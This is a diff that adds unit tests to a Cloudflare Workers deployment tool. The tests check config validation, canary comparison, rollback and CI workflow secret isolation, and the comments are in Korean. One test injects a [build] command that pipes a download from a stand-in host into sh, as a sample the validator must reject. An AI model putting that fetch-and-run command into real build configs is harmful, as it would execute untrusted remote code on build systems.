@@ -112,6 +112,189 @@ class DeployWorkerTest(unittest.TestCase):
         self.assertEqual(d.upload_version_id("", "Worker Version ID: 0f0f0f0f-1111-2222-3333-555555555555"), "0f0f0f0f-1111-2222-3333-555555555555")
         self.assertIsNone(d.upload_version_id("", "nothing"))
 
+    # ---- 2.0.0 [RVQ-01~04] 검토 SRV-02·SRV-04·I21c-02·U21-09 ----
+
+    def test_config_only_known_keys(self):
+        ok = (Path(__file__).resolve().parent.parent / "server/company-worker/wrangler.toml").read_text(encoding="utf-8")
+        self.assertEqual(d.config_problems(ok, "company"), [])
+        bad = ok + '\n[build]\ncommand = "curl https://x.example | sh"\n'
+        self.assertIn("모르는 칸 [build]", d.config_problems(bad, "company"))
+        self.assertTrue(any("이름" in x for x in d.config_problems(ok, "share")))
+        self.assertTrue(d.config_problems("name = [", "company"))
+        share = (Path(__file__).resolve().parent.parent / "server/share-worker/wrangler.toml").read_text(encoding="utf-8")
+        self.assertEqual(d.config_problems(share, "share"), [])
+
+    def test_failing_test_names(self):
+        tap = "ok 1 - a\nnot ok 2 - login counts at once # TODO\n  ---\nnot ok 3 - test/accounts.test.mjs\n# fail 1\n"
+        self.assertEqual(d.failing_tests(tap), ["login counts at once"])
+        spec = "✔ fine (2ms)\n✖ passkey needs user verification (12.5ms)\n✖ failing tests:\n✖ passkey needs user verification (12.5ms)\n"
+        self.assertEqual(d.failing_tests(spec), ["passkey needs user verification"])
+        self.assertEqual(d.failing_tests("all good"), [])
+
+    def test_canary_verdict(self):
+        self.assertEqual(d.canary_verdict({"n": 10, "err": 5}, {"n": 900, "err": 0})[0], "few")
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 1, "ms": 9000}, {"n": 900, "err": 0, "ms": 81000})[0], "ok")
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 8, "ms": 9000}, {"n": 900, "err": 9, "ms": 81000})[0], "worse")
+        # 앞 판도 비슷하게 실패하면(바깥 서비스 탓 등) 새 판 탓이 아니에요.
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 8}, {"n": 900, "err": 70})[0], "ok")
+        self.assertEqual(d.canary_verdict({"n": 100, "err": 0, "ms": 100000}, {"n": 900, "err": 0, "ms": 90000})[0], "worse")
+
+    def test_view_annotation_tag(self):
+        view = {"id": "x", "annotations": {"workers/tag": "0123456789ab", "workers/message": "2.0.0 01234567 why"}}
+        self.assertEqual(d.view_annotation(view, "workers/tag"), "0123456789ab")
+        self.assertIsNone(d.view_annotation({"annotations": {}}, "workers/tag"))
+
+    def test_ref_verdict(self):
+        heads = {"claude/project-thread-f33c16"}
+        self.assertIsNone(d.ref_verdict("main", False, heads, False))
+        self.assertIsNone(d.ref_verdict("claude/project-thread-f33c16", False, heads, False))
+        self.assertIsNotNone(d.ref_verdict("someone/else", False, heads, False))
+        self.assertIsNone(d.ref_verdict("0123abcd", True, heads, False))
+        self.assertIsNone(d.ref_verdict("0123abcd", False, heads, True))
+        self.assertIsNotNone(d.ref_verdict("0123abcd", False, heads, False))
+        self.assertIsNotNone(d.ref_verdict("", False, heads, False))
+
+    def test_summary_three_lines(self):
+        lines = d.summary_lines("시험", ["login counts at once"])
+        self.assertEqual(len(lines), 3)
+        self.assertIn("시험", lines[0])
+        self.assertIn("`login counts at once`", lines[1])
+        self.assertIn("고쳐", lines[2])
+        self.assertIn("해당 없음", d.summary_lines("앞 판")[1])
+        for stage in ("ref", "시험", "번들", "스키마 호환", "설정", "앞 판", "판 이름", "올리기", "바인딩", "카나리", "확인", "되돌리기"):
+            self.assertIn(stage, d.NEXT_STEP)
+
+    def _fake_cloud(self, status_after_undo, crons_now=("*/5 * * * *", "17 * * * *")):
+        """undo가 부르는 바깥(배포·상태·정기 작업·health)을 가짜로."""
+        calls = []
+        state = {"crons": sorted(crons_now)}
+
+        def fake_run(cmd, cwd, extra_env=None, check=True, stage="", clean_env=False):
+            calls.append(" ".join(cmd[-8:]))
+            return type("P", (), {"returncode": 0, "stdout": "", "stderr": ""})()
+
+        def fake_sched(worker, crons=None):
+            if crons is not None:
+                state["crons"] = sorted(crons)
+                calls.append(f"cron {sorted(crons)}")
+            return state["crons"]
+        patches = {"run": fake_run, "wrangler_json": lambda args, cwd: {"versions": status_after_undo},
+                   "schedules": fake_sched, "healthy": lambda *a, **k: (True, "health 200")}
+        return calls, state, patches
+
+    def _patched(self, patches):
+        real = {k: getattr(d, k) for k in patches}
+        real_sleep = d.time.sleep
+        for k, v in patches.items():
+            setattr(d, k, v)
+        d.time.sleep = lambda s: None
+
+        def restore():
+            for k, v in real.items():
+                setattr(d, k, v)
+            d.time.sleep = real_sleep
+        return restore
+
+    def test_undo_restores_crons_and_checks_status(self):
+        r = d.Ready("company", "old-0000-id", "new-1111-id", "2.0.0", "1.39.0", "")
+        r.deployed, r.crons_before = True, ["17 * * * *"]
+        calls, state, patches = self._fake_cloud([{"version_id": "old-0000-id", "percentage": 100}])
+        restore = self._patched(patches)
+        try:
+            d.undo(r, Path("."), "확인")
+        finally:
+            restore()
+        self.assertTrue(any("old-0000-id@100%" in c for c in calls))
+        self.assertEqual(state["crons"], ["17 * * * *"])
+        self.assertFalse(r.deployed)
+
+    def test_undo_that_did_not_take_is_loud(self):
+        r = d.Ready("company", "old-0000-id", "new-1111-id", "2.0.0", "1.39.0", "")
+        r.deployed = True
+        _, _, patches = self._fake_cloud([{"version_id": "new-1111-id", "percentage": 100}])
+        restore = self._patched(patches)
+        try:
+            with self.assertRaises(d.Stop) as e:
+                d.undo(r, Path("."), "확인")
+        finally:
+            restore()
+        self.assertEqual(e.exception.stage, "되돌리기")
+
+    def test_both_rolls_back_the_first_when_the_second_fails(self):
+        order = []
+
+        def fake_stage(w, src, work, sha, reason, allow_older):
+            order.append(f"upload {w}")
+            return d.Ready(w, f"old-{w}", f"new-{w}", "2.0.0", "2.0.0", "")
+
+        def fake_live(r, work, sha, reason):
+            order.append(f"live {r.worker}")
+            r.deployed = True
+            if r.worker == "share":
+                r.deployed = False  # go_live가 자기 것은 되돌리고 멈춰요
+                raise d.Stop("share health 실패", stage="확인")
+
+        def fake_undo(r, work, why):
+            order.append(f"undo {r.worker}")
+        patches = {"account": lambda: None, "stage_upload": fake_stage, "canary": lambda r, work, sha: order.append("canary company"),
+                   "go_live": fake_live, "undo": fake_undo}
+        restore = self._patched(patches)
+        try:
+            with self.assertRaises(d.Stop):
+                d.ship(["company", "share"], Path("."), "deploy", "abc123456789", "test", False)
+        finally:
+            restore()
+        # 둘 다 올리고 대조한 뒤에야 손님을 받고, 뒤의 것이 실패하면 앞의 것도 되돌려요.
+        self.assertEqual(order, ["upload company", "upload share", "canary company", "live company", "live share", "undo company"])
+
+    def test_check_mode_touches_no_traffic(self):
+        order = []
+        patches = {"account": lambda: None,
+                   "stage_upload": lambda w, *a: order.append(w) or d.Ready(w, "o", "n", "2.0.0", "2.0.0", ""),
+                   "canary": lambda *a: order.append("canary"), "go_live": lambda *a: order.append("live")}
+        restore = self._patched(patches)
+        try:
+            d.ship(["company", "share"], Path("."), "check", "abc", "", False)
+        finally:
+            restore()
+        self.assertEqual(order, ["company", "share"])
+
+    def test_workflow_keeps_the_token_away_from_branch_code(self):
+        import re
+        wf = (Path(__file__).resolve().parents[2] / ".github/workflows/deploy-server.yml").read_text(encoding="utf-8")
+        jobs = wf.split("\njobs:\n", 1)[1]
+        parts = re.split(r"(?m)^  ([a-z]+):\n", jobs)
+        blocks = dict(zip(parts[1::2], parts[2::2]))
+        self.assertEqual(sorted(blocks), ["build", "gate", "ship", "test"])
+        # 고른 브랜치의 코드가 도는 build에는 비밀값이 없어요.
+        self.assertNotIn("secrets.", blocks["build"])
+        self.assertIn("--phase build", blocks["build"])
+        # 토큰은 job 전체 env가 아니라 그 단계 env에만.
+        for name in ("gate", "ship"):
+            head = blocks[name].split("    steps:", 1)[0]
+            self.assertNotIn("CLOUDFLARE_API_TOKEN", head, name)
+        self.assertIn("secrets.CLOUDFLARE_API_TOKEN", blocks["ship"])
+        # ship은 고른 브랜치를 받지 않아요(main의 도구 + build가 만든 파일만).
+        self.assertNotIn("needs.gate.outputs.sha }}\n          path", blocks["ship"])
+        self.assertNotIn("path: target", blocks["ship"])
+        self.assertIn("github.ref == 'refs/heads/main'", blocks["gate"])
+        # 모든 actions/checkout은 열쇠를 .git에 남기지 않아요.
+        self.assertEqual(wf.count("actions/checkout@"), wf.count("persist-credentials: false"))
+        # 바깥 액션은 커밋 번호로 묶어요.
+        for line in wf.splitlines():
+            if "uses:" in line:
+                self.assertRegex(line, r"uses: [\w./-]+@[0-9a-f]{40}")
+
+    def test_build_runs_branch_code_without_scripts_or_keys(self):
+        import inspect
+        src = inspect.getsource(d.build)
+        self.assertIn("--ignore-scripts", src)
+        self.assertIn("clean_env=True", src)
+        self.assertNotIn("CLOUDFLARE_API_TOKEN", {k for k in d.SAFE_ENV})
+        self.assertNotIn("GITHUB_TOKEN", d.SAFE_ENV)
+        lock = (Path(__file__).resolve().parent / "deploy/package-lock.json").read_text(encoding="utf-8")
+        self.assertIn('"node_modules/wrangler": {\n      "version": "4.150.0"', lock)
+
 
 if __name__ == "__main__":
     unittest.main()
